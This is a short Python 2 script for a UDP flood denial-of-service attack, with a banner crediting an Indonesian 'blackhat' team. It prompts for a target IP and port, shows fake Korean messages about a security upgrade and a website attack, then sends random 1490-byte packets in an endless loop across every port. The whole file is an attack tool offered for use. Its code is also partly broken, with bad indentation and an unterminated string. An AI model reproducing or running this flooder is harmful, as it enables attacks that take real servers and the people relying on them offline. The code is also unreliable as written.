import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet 🇮🇩")
print
    print "=============================================="
    print " 건국의 아버지 = O.Bc/MATAELANGA.Km"
    print " 원산지       = REPUBLIK INDONESIA/BLACKHAT/"
    print " 지원팀       = CYBER TEAM BLACKHAT/O.Bc/"
    print "=============================================="
print
ip = raw_input(" IP 주소: ")
port = input("포트      : ")

os.system("clear")
print "현재 보안 시스템을 업그레이드 중입니다..."
time.sleep(2)
print "패키지 설치 수행..."
time.sleep(3)
print "업데이트를 기다리세요.. "
time.sleep(2)
print "IP 설치 패키지 확인"..."
time.sleep(3)
print "웹사이트 공격 시작 !!"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "멩기르 %s 바이러스 %s 트랙에 : %s"%(sent,ip,port)
     if port == 65534:
       port = 1
